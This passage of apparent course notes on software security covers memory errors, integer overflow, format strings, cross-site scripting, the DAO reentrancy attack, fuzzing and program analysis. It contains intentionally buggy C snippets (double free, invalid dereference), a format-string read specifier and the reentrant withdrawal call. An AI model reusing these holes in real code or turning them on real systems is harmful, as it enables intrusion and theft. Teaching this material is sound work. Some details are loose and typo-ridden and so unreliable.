&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; *ptr; &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// invalid since address is invalid
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;foo&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; *p = &lt;span style=&#34;color:#447fcf&#34;&gt;malloc&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;sizeof&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  *p = &lt;span style=&#34;color:#3677a9&#34;&gt;42&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;free&lt;/span&gt;(p);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;free&lt;/span&gt;(p); &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// double free&amp;#39;s are undefined behaviour
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; *p;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;memory-leak&#34; &gt;Memory Leak
&lt;span&gt;
    &lt;a href=&#34;#memory-leak&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;foo&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; *p = &lt;span style=&#34;color:#447fcf&#34;&gt;malloc&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;sizeof&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; *q = &lt;span style=&#34;color:#447fcf&#34;&gt;malloc&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;sizeof&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  *p = &lt;span style=&#34;color:#3677a9&#34;&gt;42&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;free&lt;/span&gt;(q);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; *p;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;heartbleed-vulnerability-i&#34; &gt;Heartbleed Vulnerability I
&lt;span&gt;
    &lt;a href=&#34;#heartbleed-vulnerability-i&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;h3 id=&#34;heartbleed-vulnerability-ii&#34; &gt;Heartbleed Vulnerability II
&lt;span&gt;
    &lt;a href=&#34;#heartbleed-vulnerability-ii&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;h3 id=&#34;memory-errors-are-prevalent&#34; &gt;Memory Errors are Prevalent
&lt;span&gt;
    &lt;a href=&#34;#memory-errors-are-prevalent&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;disproportionately high number of memory errors among all security vulnerabiities is that we know memory errors the best&lt;/li&gt;
&lt;li&gt;memory errors have unniversally accepted definitions (e.g. Stack Overflow website)
&lt;ul&gt;
&lt;li&gt;do not need to argue that this is a bug and not a feature&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;gradual adoption of memory-safe languages&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;common-bugs&#34; &gt;Common Bugs
&lt;span&gt;
    &lt;a href=&#34;#common-bugs&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;unsafe-integer-operations&#34; &gt;Unsafe integer operations
&lt;span&gt;
    &lt;a href=&#34;#unsafe-integer-operations&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Mathemetical integers are unbounded&lt;/li&gt;
&lt;li&gt;Machine integers are bounded by a fixed number of bits&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Best way to bounds check is to check if the old balance is subtractable and that the value is less than or equal to than the max that can be added (MAX - old balance).&lt;/p&gt;
&lt;h3 id=&#34;common-integer-overflow-and-underflow-cases&#34; &gt;Common Integer Overflow and Underflow Cases
&lt;span&gt;
    &lt;a href=&#34;#common-integer-overflow-and-underflow-cases&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;signed ⇆ unsigned&lt;/li&gt;
&lt;li&gt;size-decreasing cast (truncate)&lt;/li&gt;
&lt;li&gt;see slides for more&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;unsafe-floating-point-operations&#34; &gt;Unsafe Floating-point operations
&lt;span&gt;
    &lt;a href=&#34;#unsafe-floating-point-operations&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;floating-point number are bounded by a limited precision&lt;/li&gt;
&lt;li&gt;The Perils of Floating Point&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;pointer-relational-comparison&#34; &gt;Pointer Relational Comparison
&lt;span&gt;
    &lt;a href=&#34;#pointer-relational-comparison&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;in memory, for the same struc, the properties do appear in memory order&lt;/li&gt;
&lt;li&gt;therefore, &amp;amp;structInstance.one &amp;amp;structInstance.two&lt;/li&gt;
&lt;li&gt;however stack variables are not guarnateed to be in a certain order&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;insufficient-sanitization-on-untrusted-input&#34; &gt;Insufficient Sanitization on Untrusted Input
&lt;span&gt;
    &lt;a href=&#34;#insufficient-sanitization-on-untrusted-input&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;SQL unescaped input&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;format-strings&#34; &gt;Format Strings
&lt;span&gt;
    &lt;a href=&#34;#format-strings&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;printf is very powerful&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%7$11x&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;same-origin-policy&#34; &gt;Same-origin policy
&lt;span&gt;
    &lt;a href=&#34;#same-origin-policy&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;two urls sharing same uri schem (ftp, http, https)&lt;/li&gt;
&lt;li&gt;untrusted input shown to another user can trigger a cross-site scripting attack since the user input was not sanitized&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;untrusted-logic&#34; &gt;Untrusted Logic
&lt;span&gt;
    &lt;a href=&#34;#untrusted-logic&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;In 2016, an attacker exploited a vulnerability in Ethereum&amp;rsquo;s DAO smart contract. The attacker drained more than $3.6M.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;msg.sender.call.value(_weiToWithdraw())&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Reentrancy attack
&lt;ul&gt;
&lt;li&gt;before the checks are finished, call withdraw again which will pass all checks since the timestamp was not updated yet&lt;/li&gt;
&lt;li&gt;that means that the function is recursively called until the contract&amp;rsquo;s internal store of the balance is exhausted&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;fix:
&lt;ul&gt;
&lt;li&gt;first do the book keeping then call the function&lt;/li&gt;
&lt;li&gt;wrap function with mutex variables&lt;/li&gt;
&lt;li&gt;require the mutex to be false at the beginning of the function call&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Solidiity callback function: runs when money is sent to the contract or is interacted with&lt;/p&gt;
&lt;h3 id=&#34;data-race&#34; &gt;Data Race
&lt;span&gt;
    &lt;a href=&#34;#data-race&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;to avoid data races, need a way to synchronize between threads or clients
&lt;ul&gt;
&lt;li&gt;for threads, use mutexes and acqurie before change&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;for databases, use transactions&lt;/li&gt;
&lt;li&gt;memory errors: double free, double allocate (dangling)&lt;/li&gt;
&lt;li&gt;heisenburg and non-deterministic behaviour&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;fuzz-testing&#34; &gt;Fuzz Testing
&lt;span&gt;
    &lt;a href=&#34;#fuzz-testing&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;To drive the execution of a system into desired state&lt;/li&gt;
&lt;li&gt;system: source code, input format&lt;/li&gt;
&lt;li&gt;state: output or current state&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;genetic-algorithm&#34; &gt;Genetic Algorithm
&lt;span&gt;
    &lt;a href=&#34;#genetic-algorithm&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Feedback and Selection fo most successful&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;path-coverage&#34; &gt;Path Coverage
&lt;span&gt;
    &lt;a href=&#34;#path-coverage&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;AFL: American Fuzzy Lop&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;narrow-range-constriants&#34; &gt;Narrow-range Constriants
&lt;span&gt;
    &lt;a href=&#34;#narrow-range-constriants&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;SMT Solvers&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://fuzzing-survey.org/&#34;&gt;Fuzzers&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;finding-bugs&#34; &gt;Finding Bugs
&lt;span&gt;
    &lt;a href=&#34;#finding-bugs&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Program analysis&lt;/li&gt;
&lt;li&gt;derive properties which hold for program P (inteference)&lt;/li&gt;
&lt;li&gt;prove that a property holds for program P (verification)&lt;/li&gt;
&lt;li&gt;given a program P, generate a program P&amp;rsquo; which is
&lt;ul&gt;
&lt;li&gt;equivalent to P in most ways&lt;/li&gt;
&lt;li&gt;behaves better than P with respect to some criteria&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;concrete-semantics&#34; &gt;Concrete Semantics
&lt;span&gt;
    &lt;a href=&#34;#concrete-semantics&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;all possible executions under all possible inputs&lt;/li&gt;
&lt;li&gt;could be close to infinite which is impractical to enumerate&lt;/li&gt;
&lt;li&gt;safety properties: no possible execution should reach these erroneous states&lt;/li&gt;
&lt;li&gt;testing: consdering a subset of the possible executions&lt;/li&gt;
&lt;li&gt;bounded model checking&lt;/li&gt;
&lt;li&gt;abstract interpretation: if the abstract semantics cover all possible cases -&amp;gt; so does the concrete semantics
&lt;ul&gt;
&lt;li&gt;false alarms: widening of the model during execution&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;defenses-against-common-vulnerabilities&#34; &gt;Defenses against Common Vulnerabilities
&lt;span&gt;
    &lt;a href=&#34;#defenses-against-common-vulnerabilities&#34;&gt;
